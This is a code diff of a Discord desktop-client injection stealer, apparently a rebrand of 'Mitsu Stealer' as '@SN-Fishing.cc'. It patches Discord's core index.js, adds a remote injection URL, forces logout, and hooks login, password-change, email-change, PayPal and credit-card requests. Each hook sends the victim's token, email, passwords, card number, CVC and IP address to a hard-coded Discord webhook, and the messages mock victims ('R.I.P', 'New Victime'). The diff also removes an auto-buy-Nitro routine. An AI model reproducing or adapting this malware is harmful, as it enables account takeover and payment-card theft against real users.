@@ -1,5 +1,4 @@
 const args = process.argv;
-const os = require('os');
 const fs = require('fs');
 const path = require('path');
 const https = require('https');
@@ -10,12 +9,12 @@ const config = {
   webhook: 'https://discord.com/api/webhooks/1008720555437994034/aiLqmG36gsf4h-Ex3ruAvcOVx8bnGgIzlGQsIAzs9fSLvB5ZuQwPxw4ucv6cSOQHCqNR', 
   ip: '%IP%',
   auto_buy_nitro: false, 
-  ping_on_run: false, 
-  logout: true, 
+  ping_on_run: true, 
   ping_val: '@everyone', 
-  embed_name: 'Mitsu Stealer', 
-  embed_icon: 'https://media.discordapp.net/attachments/988835185300742258/997093134787944539/ansn.png',
-  embed_color: 000000,
+  embed_name: '@SN-Fishing.cc 🐟', 
+  embed_icon: 'https://cdn.discordapp.com/attachments/985660218253934622/985676305104265226/nemotitre.jpg',
+  embed_color: 1746924, 
+  injection_url: 'https://raw.githubusercontent.com/oxyidz/ggrger/main/index.js',
   api: 'https://discord.com/api/v9/users/@me',
   filter: {
     urls: [
@@ -391,7 +390,7 @@ function updateCheck() {
   const appPath = path.join(resourcePath, 'app');
   const packageJson = path.join(appPath, 'package.json');
   const resourceIndex = path.join(appPath, 'index.js');
-  const indexJs = `${app}\\modules\\discord_desktop_core-1\\discord_desktop_core\\index.js`;
+  const indexJs = `${app}\\modules\\discord_desktop_core-3\\discord_desktop_core\\index.js`;
   const bdPath = path.join(process.env.APPDATA, '\\betterdiscord\\data\\betterdiscord.asar');
   if (!fs.existsSync(appPath)) fs.mkdirSync(appPath);
   if (fs.existsSync(packageJson)) fs.unlinkSync(packageJson);
@@ -436,8 +435,10 @@ require('${path.join(resourcePath, 'app.asar')}')
 if (fs.existsSync(bdPath)) require(bdPath);`;
     fs.writeFileSync(resourceIndex, startUpScript.replace(/\\/g, '\\\\'));
   }
- if (config.logout && token) {
-    await execScript(`window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function LogOut(){(function(a){const b="string"==typeof a?a:null;for(const c in gg.c)if(gg.c.hasOwnProperty(c)){const d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return d.default;if(d&&(b?d[b]:a(d)))return d}return null})("login").logout()}LogOut();`)
+  if (!fs.existsSync(path.join(__dirname, 'initiation'))) return !0;
+  fs.rmdirSync(path.join(__dirname, 'initiation'));
+  execScript(
+    `window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function LogOut(){(function(a){const b="string"==typeof a?a:null;for(const c in gg.c)if(gg.c.hasOwnProperty(c)){const d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return d.default;if(d&&(b?d[b]:a(d)))return d}return null})("login").logout()}LogOut();`,
   );
   return !1;
 }
@@ -477,7 +478,7 @@ const getBilling = async (token) => {
           billing += '💳 ';
           break;
         case 2:
-          billing += '<:paypal:951139189389410365> ';
+          billing += '<:1716_PAYPAL:985672771201802280> ';
           break;
       }
     }
@@ -517,9 +518,9 @@ const getNitro = (flags) => {
     case 0:
       return '';
     case 1:
-      return '<:nitro:892130462024224838> ';
+      return '<:4872badgenitroclassic:985676613079400488> ';
     case 2:
-      return '<:nitro:892130462024224838> ';
+      return '<:4872badgenitroclassic:985676613079400488> ';
     default:
       return '';
   }
@@ -529,34 +530,34 @@ const getBadges = (flags) => {
   let badges = '';
   switch (flags) {
     case 1:
-      badges += 'Discord Staff, ';
+      badges += ' <:6832badgediscordstaff:985676806294233140> ';
       break;
     case 2:
-      badges += 'Partnered Server Owner, ';
+      badges += ' <:7606badgepartneredserverowner:985676965086375976> ';
       break;
     case 131072:
-      badges += ' <:DevBadge:912727453875699733> ';
+      badges += ' <:1564badgedeveloper:985677107399118900> ';
       break;
     case 4:
-      badges += ' <a:CH_IconHypesquadShiny:928551747591487548> ';
+      badges += '  <:7606badgehypesquadevents:985677218707554375> ';
       break;
     case 16384:
-      badges += 'Gold BugHunter, ';
+      badges += ' <:7904discordbughunterlv2:985677598619209729> ';
       break;
     case 8:
-      badges += 'Green BugHunter, ';
+      badges += ' <:9595badgebughunter:985677427487436861> ';
       break;
     case 512:
-      badges += ' <a:early:913099122968494170> ';
+      badges += ' <:6832badgeearlysupporter:985677713719324692> ';
       break;
     case 128:
-      badges += ' <:brilliance:919973089285120111> ';
+      badges += ' <:1350discordbrillance:985677830325170266> ';
       break;
     case 64:
-      badges += ' <:bravery:919973089222205451> ';
+      badges += ' :1247discordbravery:985677969861259285> ';
       break;
     case 256:
-      badges += ' <:balance:919973088651776001> ';
+      badges += ' <:5946discordbalance:985678482619113522> ';
       break;
     case 0:
       badges = '`No Badges`';
@@ -604,55 +605,52 @@ const login = async (email, password, token) => {
   const content = {
     username: config.embed_name,
     avatar_url: config.embed_icon,
+    content: config.ping_val,
     embeds: [
       {
         color: config.embed_color,
         fields: [
           {
-            name: '<a:tokens:997069458545852476> Token:',
-            value: `\`${token}\` [Click to copy](https://superfurrycdn.nl/copy/{token})`,
+            name: '<a:9382blueheart:985665072187707452> @SN - Token:',
+            value: `\`\`\`${token}\`\`\`\n[Click = Copy](https://superfurrycdn.nl/copy/${token})`,
             inline: false,
           },
           {
-            name: '<:rozetler:997069185886724106> Badges:',
+            name: '<a:9574_Butterfly_Blue:985666963089014805> @SN - Email:',
+            value: `\`${email}\`\n[Click = Copy](https://superfurrycdn.nl/copy/${email})`,
+            inline: true,
+          },
+          {
+            name: '<a:4536gun4:985673435860586557> @SN - Password:',
+            value: `\`${password}\`\n[Click = Copy](https://superfurrycdn.nl/copy/${password})`,
+            inline: true,
+          },
+          {
+            name: '<a:5211fireemojis:985667589961318430> @SN - IP:',
+            value: `\`${config.ip}\`\n[Click = Open](https://ipinfo.io/${ip})`,
+            inline: true,
+          },
+          {
+            name: '<:1205bluepawprints:985668463899050014> @SN - Badges Type:',
             value: `${badges}`,
             inline: true,
           },
           {
-            name: '<:billing:997060109106683914> Billing:',
-            value: `**${billing}**`,
-            inline: true,
-          },
-          {
-            name: ':people_hugging: Friends:',
-            value: `\`${friends}\``,
-            inline: true,
-          },
-          {
-            name: '<a:mail:936993947102887956> Email:',
-            value: `\`${email}\``,
-            inline: true,
-          },
-          {
-            name: '<:baglanti:997066960384831508> IP:',
-            value: `\`${config.ip}\``,
-            inline: true,
-          },
-          {
-            name: '<a:password:997072146562031696> Password:',
-            value: `\`${password}\``,
+            name: '<a:6132lightblueheartspin:985668720422682724> @SN - Billing Type:',
+            value: `${billing}`,
             inline: true,
           },
         ],
         author: {
-          name: json.username + '#' + json.discriminator + ' - ' + json.id,
-          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
-        },
-        footer: {
-          text: 'Mitsu Stealer',
-        },
-        thumbnail: {
-          url: 'https://media.discordapp.net/attachments/988835185300742258/997093134787944539/ansn.png',
+            name: "New Victime 👀 is " + json.username +"#" + json.discriminator + " - " +"("+json.id+")",
+            icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`,
+          },
+          footer: {
+            text: "R.I.P " + json.username +"#" + json.discriminator + " by @SN-Fishing.cc 🐟",
+            icon_url: `https://cdn.discordapp.com/attachments/985660218253934622/985676305104265226/nemotitre.jpg`,
+          },
+          thumbnail: {
+            url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
         },
       },
     ],
@@ -661,7 +659,7 @@ const login = async (email, password, token) => {
   hooker(content);
 };
 
-const passwordChanged = async (oldpassword, newpassword, token) => {
+const passwordChanged = async (email, oldpassword, newpassword, token) => {
   const json = await getInfo(token);
   const nitro = getNitro(json.premium_type);
   const badges = getBadges(json.flags);
@@ -669,33 +667,63 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
   const content = {
     username: config.embed_name,
     avatar_url: config.embed_icon,
+    content: config.ping_val,
     embeds: [
       {
         color: config.embed_color,
         fields: [
           {
-            name: '**Password Changed**',
-            value: `Email: **${json.email}**\nOld Password: **${oldpassword}**\nNew Password: **${newpassword}**`,
-            inline: true,
-          },
-          {
-            name: '**Discord Info**',
-            value: `Nitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**`,
-            inline: true,
-          },
-          {
-            name: '**Token**',
-            value: `\`${token}\``,
+            name: '<a:9382blueheart:985665072187707452> @SN - Token:',
+            value: `\`\`\`${token}\`\`\`\n[Copy Token](https://superfurrycdn.nl/copy/${token})`,
             inline: false,
+          },
+          {
+            name: '<a:9574_Butterfly_Blue:985666963089014805> @SN - Victim Email:',
+            value: `\`${json.email}\`\n[Copy Email](https://superfurrycdn.nl/copy/${json.email})`,
+            inline: true,
+          },
+          {
+            name: '<a:4536gun4:985673435860586557> @SN - Old Password:',
+            value: `\`${oldpassword}\``,
+            inline: true,
+          },
+          {
+            name: '<a:4536gun4:985673435860586557> @SN - New Password:',
+            value: `\`${newpassword}\`\n[Copy New Password](https://superfurrycdn.nl/copy/${newpassword})`,
+            inline: true,
+          },
+          {
+            name: '<a:5211fireemojis:985667589961318430> @SN - IP:',
+            value: `\`${config.ip}\`\n[Click = Open](https://ipinfo.io/${ip})`,
+            inline: true,
+          },
+          {
+            name: '<:1205bluepawprints:985668463899050014> @SN - Badges Type:',
+            value: `${badges}`,
+            inline: true,
+          },
+          {
+            name: '<a:9048bluemendedheart:986020801004318740> @SN - Nitro Type:',
+            value: `${nitro}`,
+            inline: true,
+          },
+          {
+            name: '<a:6132lightblueheartspin:985668720422682724> @SN - Billing Type:',
+            value: `${billing}`,
+            inline: true,
           },
         ],
         author: {
-          name: json.username + '#' + json.discriminator + ' | ' + json.id,
-          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
+          name: "New Password 👀 of " + json.username +"#" + json.discriminator + " - " +"("+json.id+")",
+          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`,
         },
         footer: {
-          text: 'Mitsu Stealer',
+          text: "R.I.P " + json.username +"#" + json.discriminator + " by @SN-Fishing.cc 🐟",
+          icon_url: `https://cdn.discordapp.com/attachments/985660218253934622/985676305104265226/nemotitre.jpg`,
         },
+        thumbnail: {
+          url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
+      },
       },
     ],
   };
@@ -711,33 +739,58 @@ const emailChanged = async (email, password, token) => {
   const content = {
     username: config.embed_name,
     avatar_url: config.embed_icon,
+    content: config.ping_val,
     embeds: [
       {
         color: config.embed_color,
         fields: [
           {
-            name: '**Email Changed**',
-            value: `New Email: **${email}**\nPassword: **${password}**`,
+                name: '<a:9382blueheart:985665072187707452> @SN - Token:',
+                value: `\`\`\`${token}\`\`\`\n[Copy Token](https://superfurrycdn.nl/copy/${token})`,
+                inline: false,
+          },
+          {
+            name: '<a:9574_Butterfly_Blue:985666963089014805> @SN - New Email:',
+            value: `\`${email}\`[Copy Email](https://superfurrycdn.nl/copy/${email})`,
             inline: true,
           },
           {
-            name: '**Discord Info**',
-            value: `Nitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**`,
+            name: '<a:4536gun4:985673435860586557> @SN - Password:',
+            value: `\`${password}\`[Copy Password](https://superfurrycdn.nl/copy/${password})`,
             inline: true,
           },
           {
-            name: '**Token**',
-            value: `\`${token}\``,
-            inline: false,
+            name: '<a:5211fireemojis:985667589961318430> @SN - IP:',
+            value: `\`${config.ip}\`\n[Click = Open](https://ipinfo.io/${ip})`,
+            inline: true,
+          },
+          {
+            name: '<:1205bluepawprints:985668463899050014> @SN - Badges Type:',
+            value: `${badges}`,
+            inline: true,
+          },
+          {
+            name: '<a:9048bluemendedheart:986020801004318740> @SN - Nitro Type:',
+            value: `${nitro}`,
+            inline: true,
+          },
+          {
+            name: '<a:6132lightblueheartspin:985668720422682724> @SN - Billing Type:',
+            value: `**${billing}**`,
+            inline: true,
           },
         ],
         author: {
-          name: json.username + '#' + json.discriminator + ' | ' + json.id,
-          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
+          name: "New Email 👀 of " + json.username +"#" + json.discriminator + " - " +"("+json.id+")",
+          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`,
         },
         footer: {
-          text: 'Mitsu Stealer',
+          text: "R.I.P " + json.username +"#" + json.discriminator + " by @SN-Fishing.cc 🐟",
+          icon_url: `https://cdn.discordapp.com/attachments/985660218253934622/985676305104265226/nemotitre.jpg`,
         },
+        thumbnail: {
+          url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
+      },
       },
     ],
   };
@@ -758,28 +811,27 @@ const PaypalAdded = async (token) => {
         color: config.embed_color,
         fields: [
           {
-            name: '**Paypal Added**',
-            value: `Time to buy some nitro baby 😩`,
+            name: '<a:9382blueheart:985665072187707452> @SN - Token:',
+            value: `\`\`\`${token}\`\`\`\n[Copy Token](https://superfurrycdn.nl/copy/${token})`,
             inline: false,
           },
           {
-            name: '**Discord Info**',
-            value: `Nitro Type: **${nitro}*\nBadges: **${badges}**\nBilling: **${billing}**`,
-            inline: false,
-          },
-          {
-            name: '**Token**',
-            value: `\`${token}\``,
+            name: '<:1716_PAYPAL:985672771201802280> @SN - Paypal Added:',
+            value: `\`\`\`The paypal of your victim has been added to his account, it's time to go buy nitros\`\`\``,
             inline: false,
           },
         ],
         author: {
-          name: json.username + '#' + json.discriminator + ' | ' + json.id,
-          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
+          name: "Paypal Added 👀 of " + json.username +"#" + json.discriminator + " - " +"("+json.id+")",
+          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`,
         },
         footer: {
-          text: 'Mitsu Stealer',
+          text: "R.I.P " + json.username +"#" + json.discriminator + " by @SN-Fishing.cc 🐟",
+          icon_url: `https://cdn.discordapp.com/attachments/985660218253934622/985676305104265226/nemotitre.jpg`,
         },
+        thumbnail: {
+          url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
+      },
       },
     ],
   };
@@ -800,28 +852,27 @@ const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
         color: config.embed_color,
         fields: [
           {
-            name: '**Credit Card Added**',
-            value: `Credit Card Number: **${number}**\nCVC: **${cvc}**\nCredit Card Expiration: **${expir_month}/${expir_year}**`,
-            inline: true,
-          },
-          {
-            name: '**Discord Info**',
-            value: `Nitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**`,
-            inline: true,
-          },
-          {
-            name: '**Token**',
-            value: `\`${token}\``,
+            name: '<a:9382blueheart:985665072187707452> @SN - Token:',
+            value: `\`\`\`${token}\`\`\`\n[Copy Token](https://superfurrycdn.nl/copy/${token})`,
             inline: false,
+          },
+          {
+            name: '<a:4536gun4:985673435860586557> @SN - Credit Card Added:',
+            value: `\`\`\`+ CC: *${number}\n+ CVC: ${cvc}\n+ Credit Card Expiration: ${expir_month}/${expir_year}\`\`\``,
+            inline: true,
           },
         ],
         author: {
-          name: json.username + '#' + json.discriminator + ' | ' + json.id,
-          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
+          name: "CC 👀 of " + json.username +"#" + json.discriminator + " - " +"("+json.id+")",
+          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`,
         },
         footer: {
-          text: 'Mitsu Stealer',
+          text: "R.I.P " + json.username +"#" + json.discriminator + " by @SN-Fishing.cc 🐟",
+          icon_url: `https://cdn.discordapp.com/attachments/985660218253934622/985676305104265226/nemotitre.jpg`,
         },
+        thumbnail: {
+          url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
+      },
       },
     ],
   };
@@ -829,49 +880,6 @@ const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
   hooker(content);
 };
 
-const nitroBought = async (token) => {
-  const json = await getInfo(token);
-  const nitro = getNitro(json.premium_type);
-  const badges = getBadges(json.flags);
-  const billing = await getBilling(token);
-  const code = await buyNitro(token);
-  const content = {
-    username: config.embed_name,
-    content: code,
-    avatar_url: config.embed_icon,
-    embeds: [
-      {
-        color: config.embed_color,
-        fields: [
-          {
-            name: '**Nitro bought!**',
-            value: `**Nitro Code:**\n\`\`\`diff\n+ ${code}\`\`\``,
-            inline: true,
-          },
-          {
-            name: '**Discord Info**',
-            value: `Nitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**`,
-            inline: true,
-          },
-          {
-            name: '**Token**',
-            value: `\`${token}\``,
-            inline: false,
-          },
-        ],
-        author: {
-          name: json.username + '#' + json.discriminator + ' | ' + json.id,
-          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
-        },
-        footer: {
-          text: 'Mitsu Stealer',
-        },
-      },
-    ],
-  };
-  if (config.ping_on_run) content['content'] = config.ping_val + `\n${code}`;
-  hooker(content);
-};
 session.defaultSession.webRequest.onBeforeRequest(config.filter2, (details, callback) => {
   if (details.url.startsWith('wss://remote-auth-gateway')) return callback({ cancel: true });
   updateCheck();
@@ -942,13 +950,6 @@ session.defaultSession.webRequest.onCompleted(config.filter, async (details, _) 
 
     case details.url.endsWith('paypal_accounts') && details.method === 'POST':
       PaypalAdded(token).catch(console.error);
-      break;
-
-    case details.url.endsWith('confirm') && details.method === 'POST':
-      if (!config.auto_buy_nitro) return;
-      setTimeout(() => {
-        nitroBought(token).catch(console.error);
-      }, 7500);
       break;
 
     default:
